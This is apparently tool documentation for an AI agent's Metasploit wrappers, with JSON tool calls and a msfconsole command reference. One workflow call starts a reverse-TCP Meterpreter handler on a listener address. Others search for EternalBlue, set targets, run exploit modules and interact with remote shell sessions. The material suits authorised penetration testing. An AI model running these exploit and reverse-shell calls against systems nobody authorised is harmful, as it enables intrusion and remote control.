# Metasploit (`msf_check`, `msf_command`, `msf_run`, `msf_sessions`)

## Installation

- Homebrew: `brew install metasploit`
- Kali: pre-installed
- RPC setup: `msfrpcd -P YOURPASS -S`

## Tools

| Tool | Purpose |
|------|---------|
| `msf_check` | Check if MSF is available |
| `msf_command` | Raw msfconsole command |
| `msf_run` | Configure + execute module |
| `msf_sessions` | List/kill/interact sessions |

## Workflows

```json
{"tool": "msf_check", "args": {}}
{"tool": "msf_command", "args": {"cmd": "search eternalblue"}}
{"tool": "msf_run", "args": {"module": "exploit/multi/handler", "payload": "windows/meterpreter/reverse_tcp", "options": {"LHOST": "10.0.0.5", "LPORT": "4444"}}}
{"tool": "msf_sessions", "args": {"action": "list"}}
```

## Common msfconsole commands

| Command | Purpose |
|---------|---------|
| `search cve:2021` | Search by CVE |
| `use exploit/path` | Select module |
| `set RHOSTS x.x.x.x` | Set target |
| `set LHOST x.x.x.x` | Set your IP |
| `show options` | Show required fields |
| `check` | Test if vulnerable |
| `run -j` | Run as background job |
| `sessions -i 1` | Interact session 1 |
| `sessions -k 1` | Kill session 1 |

## Payload types

| Type | Purpose | Example |
|------|---------|---------|
| Staged (`/`) | Small stub fetches stage | `windows/meterpreter/reverse_tcp` |
| Stageless (`_`) | Self-contained | `windows/meterpreter_reverse_tcp` |
